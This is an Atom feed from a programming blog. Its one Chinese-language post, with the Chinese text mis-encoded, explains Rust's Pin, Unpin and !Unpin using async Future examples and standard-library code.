<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-cn"><title type="text">MinCodes</title><subtitle type="html">MinCodes, Minimal but useful Codes</subtitle><updated>2024-03-20T09:34:29+00:00</updated><id>https://mincodes.com/</id><link rel="alternate" type="text/html" href="https://mincodes.com/"/><link rel="self" type="application/atom+xml" href="https://mincodes.com/atom.xml"/><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><generator uri="https://gohugo.io/" version="0.124.0">Hugo</generator><entry><title type="text">Rust ä¸­çš„ Pin, Unpin å’Œ !Unpin</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/pin-unpin-in-rust/"/><id>https://mincodes.com/posts/pin-unpin-in-rust/</id><updated>2024-03-20T17:13:48+08:00</updated><published>2024-03-19T11:54:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">ä¸ºä»€ä¹ˆéœ€è¦ Pin? å¼•å…¥ Pin çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†æ”¯æŒ è‡ªå¼•ç”¨ç±»å‹ (self-referential types) ã€‚ä¸‹é¢æˆ‘ä»¬ä»¥ Future ä¸ºä¾‹ï¼Œè§£é‡Šä¸€ä¸‹è‡ªå¼•ç”¨ç±»å‹ä»¥åŠå¼•å…¥ Pinâ€¦</summary><content type="html">&lt;h2 id="ä¸ºä»€ä¹ˆéœ€è¦-pin">ä¸ºä»€ä¹ˆéœ€è¦ &lt;code>Pin&lt;/code>?&lt;/h2>
&lt;p>å¼•å…¥ &lt;code>Pin&lt;/code> çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†æ”¯æŒ &lt;strong>è‡ªå¼•ç”¨ç±»å‹ (self-referential types)&lt;/strong> ã€‚ä¸‹é¢æˆ‘ä»¬ä»¥
&lt;code>Future&lt;/code> ä¸ºä¾‹ï¼Œè§£é‡Šä¸€ä¸‹è‡ªå¼•ç”¨ç±»å‹ä»¥åŠå¼•å…¥ &lt;code>Pin&lt;/code> çš„å¿…è¦æ€§ã€‚&lt;/p>
&lt;p>ç”±äºå¼‚æ­¥å‡½æ•°ä¸­å¯èƒ½åŒ…å«å¯¹å±€éƒ¨å˜é‡çš„å¼•ç”¨ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">async&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">read_into_buf_fut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">read_into_buf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">read_into_buf_fut&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">await&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{:?}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™ç±»ä»£ç åœ¨ç”Ÿæˆ Future ç»“æ„æ—¶ï¼Œå°±ä¼šå‡ºç° &lt;strong>è‡ªå¼•ç”¨ç±»å‹ (self-referential types)&lt;/strong>, ä¾‹å¦‚ï¼Œä¸Šé¢çš„ä»£ç å¯èƒ½ç”Ÿæˆç±»ä¼¼ä¸‹é¢çš„ Future ç»“æ„ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="nc">ReadIntoBuf&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">buf&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span> &lt;span class="nc">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">u8&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// points to `x` below
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">AsyncFuture&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="p">[&lt;/span>&lt;span class="kt">u8&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">read_into_buf_fut&lt;/span>: &lt;span class="nc">ReadIntoBuf&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="na">&amp;#39;what_lifetime&lt;/span>&lt;span class="o">?&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™ç±»ç»“æ„å¦‚æœä¸èƒ½ä¿è¯ self åœ°å€çš„ç¨³å®šæ€§ï¼Œåˆ™ä¼šå‡ºç°ä¸¥é‡çš„å®‰å…¨éšæ‚£ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ
AsyncFuture å‘ç”Ÿäº†ç§»åŠ¨ï¼Œåˆ™ x çš„åœ°å€ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œä»è€Œå¯¼è‡´ ReadIntoBuf ä¸­å­˜å‚¨çš„
buf æŒ‡é’ˆå¤±æ•ˆã€‚&lt;/p>
&lt;p>è¦é˜²æ­¢è¯¥é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥ &lt;code>Pin&lt;/code> æ¥ç¡®ä¿ self åœ°å€çš„ç¨³å®šæ€§ï¼Œä»¥ä¾¿åœ¨ &lt;code>async&lt;/code> å—ä¸­å®‰å…¨åœ°åˆ›å»ºå¼•ç”¨ã€‚&lt;/p>
&lt;p>æ›´å¤šç»†èŠ‚å¯å‚è€ƒ &lt;a href="https://rust-lang.github.io/async-book/04_pinning/01_chapter.html">Pinning - Asynchronous Programming in Rust&lt;/a>ã€‚&lt;/p>
&lt;h2 id="pin-æ˜¯ä»€ä¹ˆ">&lt;code>Pin&lt;/code> æ˜¯ä»€ä¹ˆï¼Ÿ&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>Pin&amp;lt;P&amp;gt;&lt;/code> æ˜¯ä¸€ä¸ª &lt;code>struct&lt;/code>, å¯ç”¨äºåŒ…è£…ä»»æ„çš„æŒ‡é’ˆç±»å‹ &lt;code>P&lt;/code>, è€Œ &lt;code>Unpin&lt;/code> å’Œ &lt;code>!Unpin&lt;/code> éƒ½æ˜¯
&lt;code>trait&lt;/code> ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Pin&amp;lt;P&amp;gt;&lt;/code> æ˜¯ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆï¼Œå¯ä¿è¯å…¶åŒ…è£…çš„æŒ‡é’ˆ &lt;code>P&lt;/code> åé¢çš„å€¼ä¸ä¼šå‘ç”Ÿç§»åŠ¨ï¼ˆå³ç‰©ç†åœ°å€ä¿æŒç¨³å®šä¸”æœ‰æ•ˆï¼‰ï¼Œå‰ææ˜¯å…¶ç›®æ ‡ç±»å‹æ²¡æœ‰å®ç° &lt;code>Unpin&lt;/code> ã€‚&lt;/p>
&lt;p>ä¾‹å¦‚ï¼Œ &lt;code>Pin&amp;lt;&amp;amp;mut T&amp;gt;&lt;/code>, &lt;code>Pin&amp;lt;&amp;amp;T&amp;gt;&lt;/code>, &lt;code>Pin&amp;lt;Box&amp;lt;T&amp;gt;&amp;gt;&lt;/code> éƒ½èƒ½ä¿è¯ &lt;code>T&lt;/code> ä¸ä¼šå‘ç”Ÿç§»åŠ¨ï¼Œå¦‚æœ &lt;code>T: !Unpin&lt;/code> ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¤§å¤šæ•°ç±»å‹åœ¨ç§»åŠ¨æ—¶éƒ½æ²¡å•¥é—®é¢˜ï¼Œè¿™äº›ç±»å‹å®ç°äº†ä¸€ä¸ªå« &lt;code>Unpin&lt;/code> çš„ traitã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å¯¹äºè¿™äº›ç±»å‹æ¥è®²ï¼ŒPin å‰å’Œ Pin ååœ¨ä½¿ç”¨ä¸ŠåŸºæœ¬ä¸€æ ·ï¼Œä¸å—å½±å“ã€‚ä¾‹å¦‚ &lt;code>Pin&amp;lt;&amp;amp;mut u8&amp;gt;&lt;/code> çš„è¡Œä¸ºå’Œ &lt;code>&amp;amp;mut u8&lt;/code> æ²¡å•¥åŒºåˆ«ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç”±äºæ ‡å‡†åº“ä¸º &lt;code>Unpin&lt;/code> æä¾›äº† &lt;code>DerefMut&lt;/code> çš„ä¸€æ½å­å®ç°ï¼Œå› æ­¤ï¼Œå¦‚æœ &lt;code>T&lt;/code> å®ç°äº† &lt;code>Unpin&lt;/code>
trait, åˆ™å¯ä»¥é€šè¿‡ Deref Coercion è‡ªåŠ¨è·å¾— &lt;code>Pin&lt;/code> å¯¹è±¡çš„å¯å˜å¼•ç”¨ &lt;code>&amp;amp;mut T&lt;/code>, ä¹Ÿå¯ä»¥é€šè¿‡ &lt;code>Pin::get_mut&lt;/code> æ–¹æ³•æ‰‹åŠ¨è·å– &lt;code>&amp;amp;mut T&lt;/code>, è¿™æ„å‘³ç€å¯ä»¥å®‰å…¨åœ°å¯¹ &lt;code>T&lt;/code> è¿›è¡Œä¿®æ”¹ã€‚&lt;/p>
&lt;p>è¯¦æƒ…å¯å‚è€ƒ &lt;a href="https://mincodes.com/posts/pin-unpin-in-rust/#pin-%E7%9A%84%E4%B8%8D%E5%8F%AF%E7%A7%BB%E5%8A%A8%E6%80%A7%E6%98%AF%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%99%A8%E6%9D%A5%E4%BF%9D%E8%AF%81%E7%9A%84">Pin çš„ä¸å¯ç§»åŠ¨æ€§æ˜¯é€šè¿‡ç¼–è¯‘å™¨æ¥ä¿è¯çš„&lt;/a> ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>å¦‚æœ T å¸¦æœ‰ &lt;code>!Unpin&lt;/code> markerï¼Œä¸€æ—¦è¢« pin åˆ™ &lt;code>T&lt;/code> ä¸å¯ç§»åŠ¨ã€‚&lt;/p>
&lt;ul>
&lt;li>&lt;code>Future&lt;/code> å°±æ˜¯ä¸€ä¸ª &lt;code>!Unpin&lt;/code> çš„ä¾‹å­ã€‚&lt;/li>
&lt;li>å¤§å¤šæ•°ç±»å‹é»˜è®¤å®ç°äº† &lt;code>Unpin&lt;/code>, å¦‚æœè¦å¼ºåˆ¶å®ç° &lt;code>!Unpin&lt;/code>, å¯ä»¥åœ¨ç»“æ„ä½“ä¸­æ·»åŠ ä¸€ä¸ª
&lt;code>PhantomPinned&lt;/code> å­—æ®µã€‚å‚è€ƒ &lt;a href="https://mincodes.com/posts/pin-unpin-in-rust/#unpin-%E5%92%8C-pin-box-t-%E7%A4%BA%E4%BE%8B"> &lt;code>!Unpin&lt;/code> å’Œ &lt;code>Pin&amp;lt;Box&amp;lt;T&amp;gt;&amp;gt;&lt;/code> ç¤ºä¾‹&lt;/a> ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>åœ¨ &lt;code>T: !Unpin&lt;/code> çš„å‰æä¸‹ï¼Œä¿è¯ &lt;code>T&lt;/code> ä¸ä¼šå‘ç”Ÿç§»åŠ¨æ„å‘³ç€ &lt;code>T&lt;/code> çš„ç‰©ç†åœ°å€æ˜¯ç¨³å®šä¸”æœ‰æ•ˆçš„ï¼Œæˆ‘ä»¬å¯ä»¥å§‹ç»ˆä¾èµ–è¯¥åœ°å€ã€‚&lt;/p>
&lt;p>è¿™ç‚¹ä¸»è¦é€šè¿‡é™åˆ¶å¯¹ &lt;code>T&lt;/code> çš„ä¿®æ”¹æ¥è§£å†³ã€‚å› ä¸ºå¯¹äº &lt;code>T: !Unpin&lt;/code> æ¥è¯´ï¼Œæˆ‘ä»¬æ‹¿ä¸åˆ° &lt;code>Pin&lt;/code> æ‰€æŒ‡å‘çš„ &lt;code>T&lt;/code> çš„å¯å˜å¼•ç”¨ã€‚è¯¦æƒ…å¯å‚è€ƒ &lt;a href="https://mincodes.com/posts/pin-unpin-in-rust/#pin-%E7%9A%84%E4%B8%8D%E5%8F%AF%E7%A7%BB%E5%8A%A8%E6%80%A7%E6%98%AF%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%99%A8%E6%9D%A5%E4%BF%9D%E8%AF%81%E7%9A%84">Pin çš„ä¸å¯ç§»åŠ¨æ€§æ˜¯é€šè¿‡ç¼–è¯‘å™¨æ¥ä¿è¯çš„&lt;/a> ã€‚&lt;/p>
&lt;blockquote>
&lt;p>ğŸŒŸ å¯¹ &lt;a href="https://doc.rust-lang.org/std/pin/struct.Pin.html#method.set"> &lt;code>Pin::set&lt;/code> &lt;/a> æ–¹æ³•çš„ç†è§£ã€‚&lt;/p>
&lt;p>&lt;code>Pin::set&lt;/code> æ–¹æ³•å¯ä»¥è®¾ç½®ä¸€ä¸ªæ–°çš„ &lt;code>T&lt;/code> å€¼ä»¥æ›¿æ¢æ—§å€¼ã€‚è¯·æ³¨æ„ï¼Œè¿™ç§æ›¿æ¢æ°¸è¿œæ˜¯ä¸€ä¸ªå®Œæ•´çš„ã€åˆæ³•çš„ &lt;code>T&lt;/code> å€¼æ›¿æ¢å¦ä¸€ä¸ª &lt;code>T&lt;/code> å€¼ï¼Œè¿™ç‚¹å’Œç›´æ¥è·å– &lt;code>mut&lt;/code> å¼•ç”¨æœ‰æ‰€ä¸åŒï¼Œå› ä¸ºç›´æ¥è·å– &lt;code>mut&lt;/code> å¼•ç”¨å¯èƒ½ä¼šå¯¼è‡´ä¸å®‰å…¨çš„ä¿®æ”¹ï¼ˆä¾‹å¦‚å¯¹è‡ªå¼•ç”¨ç±»å‹çš„ &lt;code>swap&lt;/code> æ“ä½œï¼‰ã€‚åŒæ—¶ï¼Œ
&lt;code>set&lt;/code> æ–¹æ³•ä¼šå¼•èµ·æ—§çš„å€¼çš„ææ„ï¼Œå› æ­¤æ˜¯å®‰å…¨çš„ï¼Œæ²¡æœ‰è¿å &lt;code>Pin&lt;/code> åè®®ã€‚&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>Pin å¯ä»¥å‘ç”Ÿåœ¨æ ˆä¸Šï¼Œä¹Ÿå¯ä»¥å‘ç”Ÿåœ¨å †ä¸Šã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>æ ˆä¸Šçš„ Pin ä¾èµ–äº &lt;code>unsafe&lt;/code> ä»£ç ï¼Œä¸”éœ€è¦ç”± æˆ‘ä»¬è‡ªå·±æä¾›è¢« Pin å€¼çš„ç”Ÿå‘½å‘¨æœŸçš„ä¿è¯ï¼Œå¦åˆ™å¯èƒ½è¿å Pin å¥‘çº¦ã€‚ï¼ˆæ›´æ–°ï¼šRust 1.68 å¼•å…¥äº† &lt;a href="https://doc.rust-lang.org/std/pin/macro.pin.html">å®‰å…¨ç‰ˆæœ¬çš„æ ˆä¸Š pin å®&lt;/a>
&lt;code>std::pin::pin!()&lt;/code> ï¼‰ã€‚å‚è€ƒ &lt;a href="https://mincodes.com/posts/pin-unpin-in-rust/#unpin-%E5%92%8C-pin-box-t-%E7%A4%BA%E4%BE%8B"> &lt;code>!Unpin&lt;/code> å’Œ &lt;code>Pin&amp;lt;Box&amp;lt;T&amp;gt;&amp;gt;&lt;/code> ç¤ºä¾‹&lt;/a> ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å †ä¸Šçš„ Pin ç›´æ¥ç”¨ &lt;code>Box::pin()&lt;/code> å³å¯ã€‚å‚è€ƒ &lt;a href="https://mincodes.com/posts/pin-unpin-in-rust/#unpin-%E5%92%8C-pin-box-t-%E7%A4%BA%E4%BE%8B"> &lt;code>Unpin&lt;/code> å’Œ &lt;code>Pin&amp;lt;Box&amp;lt;T&amp;gt;&amp;gt;&lt;/code> ç¤ºä¾‹&lt;/a> ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="pin-çš„ä¸å¯ç§»åŠ¨æ€§æ˜¯é€šè¿‡ç¼–è¯‘å™¨æ¥ä¿è¯çš„">&lt;code>Pin&lt;/code> çš„ä¸å¯ç§»åŠ¨æ€§æ˜¯é€šè¿‡ç¼–è¯‘å™¨æ¥ä¿è¯çš„&lt;/h2>
&lt;p>&lt;code>Pin&amp;lt;P&amp;gt;&lt;/code> ä»…ä¸º Target ä¸º &lt;code>Unpin&lt;/code> çš„å¯å˜å¼•ç”¨å®ç°äº† &lt;code>DerefMut&lt;/code>, å…¶ä»–æƒ…å†µéƒ½åªèƒ½è·å¾— Target
çš„ä¸å¯å˜å¼•ç”¨ã€‚&lt;/p>
&lt;p>å‚è€ƒæ ‡å‡†åº“ä¸­çš„ &lt;code>Pin&lt;/code> å®ç°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">P&lt;/span>: &lt;span class="nc">Deref&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Deref&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Pin&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">P&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">type&lt;/span> &lt;span class="nc">Target&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">P&lt;/span>::&lt;span class="n">Target&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">deref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">P&lt;/span>::&lt;span class="n">Target&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Pin&lt;/span>::&lt;span class="n">get_ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Pin&lt;/span>::&lt;span class="n">as_ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// ä¸º Target ä¸º Unpin çš„å¯å˜å¼•ç”¨æä¾›çš„ DerefMut å®ç°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">P&lt;/span>: &lt;span class="nc">DerefMut&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">Target&lt;/span>: &lt;span class="nb">Unpin&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DerefMut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Pin&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">P&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">deref_mut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">P&lt;/span>::&lt;span class="n">Target&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Pin&lt;/span>::&lt;span class="n">get_mut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Pin&lt;/span>::&lt;span class="n">as_mut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="pin-çš„ä½¿ç”¨åœºæ™¯ç¤ºä¾‹">&lt;code>Pin&lt;/code> çš„ä½¿ç”¨åœºæ™¯ç¤ºä¾‹&lt;/h2>
&lt;h3 id="éœ€è¦é€šè¿‡-future-çš„-and-mut-å¼•ç”¨è°ƒç”¨-dot-await-æ–¹æ³•æ—¶">éœ€è¦é€šè¿‡ &lt;code>Future&lt;/code> çš„ &lt;code>&amp;amp;mut _&lt;/code> å¼•ç”¨è°ƒç”¨ &lt;code>.await&lt;/code> æ–¹æ³•æ—¶&lt;/h3>
&lt;ul>
&lt;li>&lt;code>async fn&lt;/code> è¿”å›çš„ Future æ˜¯ &lt;code>!Unpin&lt;/code> çš„&lt;/li>
&lt;li>Future åœ¨è¢« poll ä¹‹å‰ï¼Œå¿…é¡»è¢« pin ä½&lt;/li>
&lt;li>ç›´æ¥åœ¨ Future ä¸Šè°ƒç”¨ &lt;code>.await&lt;/code> ä¼šè‡ªåŠ¨å¤„ç† pin çš„é€»è¾‘ï¼Œä½†æ˜¯ä¼šå°†è¯¥ Future æ¶ˆè€—æ‰&lt;/li>
&lt;li>è¦æƒ³ä¸æ¶ˆè€—æ‰ Future (ä¾‹å¦‚åœ¨ loop é‡Œé¢å¯¹ Future è¿›è¡Œ &lt;code>select!&lt;/code>), éœ€è¦é€šè¿‡ mut å¼•ç”¨æ¥è°ƒç”¨ &lt;code>.await&lt;/code> æ–¹æ³•ã€‚&lt;/li>
&lt;li>é€šè¿‡ mut å¼•ç”¨ &lt;code>.await&lt;/code> å‰ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨å…ˆå°† Future pin ä½ã€‚&lt;/li>
&lt;li>Pin æœ‰ä¸¤ç§æ–¹å¼ï¼š
&lt;ul>
&lt;li>&lt;strong>åœ¨å †ä¸Š pin:&lt;/strong> ä½¿ç”¨ &lt;code>Box::pin&lt;/code> å°†æ•°æ®åˆ†é…åˆ°å †ä¸Šå¹¶ pin ä½ã€‚&lt;/li>
